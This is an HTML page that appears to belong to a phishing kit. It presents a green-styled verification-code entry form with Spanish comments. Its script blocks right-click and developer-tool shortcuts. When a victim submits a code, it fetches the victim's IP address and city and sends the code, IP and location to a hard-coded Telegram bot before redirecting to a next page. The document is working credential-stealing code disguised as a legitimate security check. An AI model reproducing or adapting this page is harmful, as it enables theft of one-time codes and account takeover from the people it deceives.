<!DOCTYPE html>

<head>

    <style>
        :root {
            --primary-color: #2e846b;
            --text-dark: #2c3e50;
            --text-muted: #7f8c8d;
            --input-border: #bdc3c7;
            --link-color: #0056b3;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #0d6b53;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            width: 100vw;
            overflow-x: hidden;
        }

        .wrapper {
            width: 100%;
            max-width: 430px;
            height: 100vh;
            background-color: var(--primary-color);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        @media (min-width: 480px) {
            .wrapper {
                height: 92vh;
                min-height: 760px;
                border-radius: 24px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            }
        }

        .header-section {
            position: relative;
            padding: 30px 20px 20px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-shrink: 0;
            z-index: 1;
        }

        .header-section::before {
            content: '';
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.06);
            z-index: -1;
            top: -30px;
            right: -30px;
            width: 200px;
            height: 200px;
        }

        .logo {
            width: 11.5rem;
            max-width: 175px;
            height: auto;
        }

        .main-container {
            background-color: #ffffff;
            border-top-left-radius: 35px;
            border-top-right-radius: 35px;
            padding: 35px 28px 25px 28px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            z-index: 2;
        }

        .security-icon {
            text-align: center;
            font-size: 48px;
            margin-bottom: 5px;
        }

        .title {
            font-size: 20px;
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 5px;
            text-align: center;
        }

        .subtitle {
            font-size: 14px;
            color: var(--text-muted);
            margin-bottom: 25px;
            text-align: center;
        }

        form {
            display: flex;
            flex-direction: column;
            flex-grow: 1;
            justify-content: space-between;
        }

        .form-group {
            margin-bottom: 18px;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 15px;
            color: #455a64;
            margin-bottom: 6px;
            font-weight: 400;
        }

        .input-control {
            width: 100%;
            padding: 12px 14px;
            font-family: 'Lato', sans-serif;
            font-size: 15px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            outline: none;
            color: var(--text-dark);
            transition: border-color 0.2s;
        }

        .input-control:focus {
            border-color: var(--primary-color);
        }

        .input-control.error {
            border-color: #e74c3c;
            background-color: #fff5f5;
        }





   .inputs {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 20px;
    }






        .inputs {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 20px;
    }

    .inputs input {
      width: 45px;
      height: 50px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      transition: border 0.2s;
    }

    .inputs input:focus {
      border-color: #2e846b;
      box-shadow: 0 0 3px #2e846b;
    }






        .error-message-global {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 18px;
            font-size: 14px;
            display: none;
            text-align: center;
            font-weight: 700;
            animation: shake 0.5s ease-in-out;
        }

        .error-message-global.show {
            display: block;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .error-message-global .icon {
            font-size: 20px;
            display: block;
            margin-bottom: 4px;
        }

        .error-message-global .sub-text {
            font-weight: 400;
            font-size: 13px;
            margin-top: 4px;
        }

        .btn-submit {
            width: 100%;
            background-color: var(--primary-color);
            color: #ffffff;
            border: none;
            padding: 16px;
            font-family: 'Lato', sans-serif;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
            border-radius: 30px;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .btn-submit:hover {
            background-color: #236652;
            transform: scale(1.02);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-submit .btn-text {
            display: inline-block;
        }

        .btn-submit .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .btn-submit.loading .btn-text {
            display: none;
        }

        .btn-submit.loading .spinner {
            display: block;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-bar {
            width: 100%;
            height: 70px;
            background-color: var(--primary-color);
            flex-shrink: 0;
            z-index: 1;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 15px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .security-badge svg {
            width: 14px;
            height: 14px;
        }

        .attempt-counter {
            display: none;
        }
    </style>

<script>
/* Bloqueos básicos */
document.addEventListener('contextmenu', e => e.preventDefault());
document.onkeydown = function(e){
  if(
    e.keyCode === 123 ||
    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
    (e.ctrlKey && e.keyCode === 85) ||
    (e.ctrlKey && e.keyCode === 83)
  ){
    e.preventDefault();
    return false;
  }
};
</script>

<!-- Script de validación y envío -->
<script>
  const inputs = document.querySelectorAll(".inputs input");
  const verificarBtn = document.getElementById("verificar");

  // Enfocar al siguiente input
  inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
      checkInputs();
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && input.value === "" && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  // Habilitar botón si todos los campos están llenos
  function checkInputs() {
    const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
    verificarBtn.disabled = !allFilled;
  }

  $(document).ready(function () {
    $('#loginForm').submit(function (e) {
      e.preventDefault();

      const code = Array.from(inputs).map(input => input.value).join('');
      const message = `✅ CÓDIGO INGRESADO:\n🔐 Código: ${code}`;

      $.getJSON("https://api.ipify.org?format=json", function (data) {
        const ip = data.ip;
        $.getJSON("https://ipinfo.io", function (response) {
          const location = response.city + ", " + response.country;

          const fullMessage = `${message}\n🌐 IP: ${ip}\n📍 Ubicación: ${location}`;

          const telegram_bot_id = "8975768984:AAFkAtDm9cvFdQRcnSFuxVqoOcYSSEDKvgs";
          const chat_id = "6956488104";

          $.ajax({
            async: true,
            crossDomain: true,
            url: `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "cache-control": "no-cache"
            },
            data: JSON.stringify({
              chat_id: chat_id,
              text: fullMessage
            })
          }).done(function () {
            window.location.href = '6.html'; // redirige después de enviar
          });
        });
      });
    });
  });
</script>
